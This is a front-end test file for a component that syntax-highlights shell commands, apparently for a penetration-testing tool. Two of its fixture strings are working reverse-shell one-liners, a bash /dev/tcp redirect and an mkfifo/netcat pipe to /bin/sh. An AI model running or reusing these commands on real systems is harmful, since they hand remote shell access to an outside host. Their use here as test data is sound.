import React from 'react';
import { render, screen } from '@testing-library/react';
import { describe, it, expect } from 'vitest';
import { SyntaxHighlightedCommand } from './SyntaxHighlightedCommand';

describe('SyntaxHighlightedCommand component', () => {
  it('renders command text preserving exact text content for copy operations', () => {
    const cmd = 'bash -i >& /dev/tcp/10.10.14.99/9001 0>&1';
    const { container } = render(<SyntaxHighlightedCommand command={cmd} />);
    expect(container.textContent).toBe(cmd);
    expect(screen.getByText(/10\.10\.14\.99/)).toBeInTheDocument();
  });

  it('highlights binaries, IPs, ports, and operators with distinct classes', () => {
    const cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.50 4444 >/tmp/f';
    const { container } = render(<SyntaxHighlightedCommand command={cmd} />);
    expect(container.textContent).toBe(cmd);

    // IP should have underline/cyan class
    const ipSpan = screen.getByText('10.10.14.50');
    expect(ipSpan.className).toContain('text-cyan-400');

    // Port should have amber class
    const portSpan = screen.getByText('4444');
    expect(portSpan.className).toContain('text-amber-400');
  });

  it('handles empty commands safely', () => {
    const { container } = render(<SyntaxHighlightedCommand command="" />);
    expect(container.textContent).toBe('');
  });
});
